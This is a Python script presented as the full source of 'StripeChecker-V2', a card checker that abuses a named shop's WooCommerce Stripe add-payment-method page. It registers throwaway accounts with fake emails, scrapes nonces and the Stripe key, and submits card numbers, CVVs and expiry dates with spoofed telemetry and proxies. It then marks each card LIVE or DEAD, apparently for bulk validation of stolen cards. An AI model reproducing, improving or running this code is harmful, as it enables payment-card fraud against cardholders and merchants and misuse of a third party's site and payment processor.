# StripeChecker-V2 by walterwhite-69 — ПОЛНЫЙ ИСХОДНИК (референс)
# Donor: dilaboards.com | WooCommerce SetupIntent flow
# ThreadPoolExecutor + faker + random telemetry

import requests, json, re, time, random, datetime, os, threading
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any, Optional
from faker import Faker
# from rich.console import Console (UI removed for clarity)

faker = Faker()

def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
    session = requests.Session()
    base_url = 'https://dilaboards.com'
    user_ag = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

    # STAGE 1: GET page, extract register-nonce + publishable key
    url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
    response_1 = session.get(url_1, headers={'User-Agent': user_ag})
    reg_match = re.search('name=""woocommerce-register-nonce"" value=""(.+?)""', response_1.text)
    pk_match = re.search('""key"":""(.+?)""', response_1.text)
    register_nonce = reg_match.group(1)
    pk = pk_match.group(1)

    # STAGE 2: Register with fake email
    data_2 = {
        'email': faker.email(),
        'woocommerce-register-nonce': register_nonce,
        'register': 'Register',
    }
    response_2 = session.post(url_1, headers={'User-Agent': user_ag}, data=data_2)
    nonce_match = re.search('""createAndConfirmSetupIntentNonce"":""(.+?)""', response_2.text)
    ajax_nonce = nonce_match.group(1)

    # STAGE 3: Create PaymentMethod via Stripe API
    muid = str(random.randint(10000000, 99999999)) + '-0000-0000-0000'
    sid = str(random.randint(10000000, 99999999)) + '-0000-0000-0000'
    guid = str(random.randint(10000000, 99999999)) + '-0000-0000-0000'
    client_id = 'src_' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))

    data_3 = {
        'type': 'card',
        'card[number]': card_num,
        'card[cvc]': card_cvv,
        'card[exp_year]': card_yy,
        'card[exp_month]': card_mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][postal_code]': '11081',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
        'referrer': base_url,
        'time_on_page': str(random.randint(10000, 99999)),
        'client_attribution_metadata[client_session_id]': client_id,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': guid, 'muid': muid, 'sid': sid, 'key': pk,
        '_stripe_version': '2024-06-20',
    }
    response_3 = requests.post('https://api.stripe.com/v1/payment_methods', 
                                headers={'User-Agent': user_ag}, data=data_3, proxies=proxies)
    pm = response_3.json().get('id')

    # STAGE 4: Confirm SetupIntent via WooCommerce AJAX
    params_4 = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
    data_4 = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    response_4 = session.post(base_url + '/en/', headers={'User-Agent': user_ag},
                              params=params_4, data=data_4, proxies=proxies)
    
    status = 'LIVE' if response_4.json().get('success') else 'DEAD'
    return f'{status} | {response_4.json().get(""message"", ""no msg"")}'
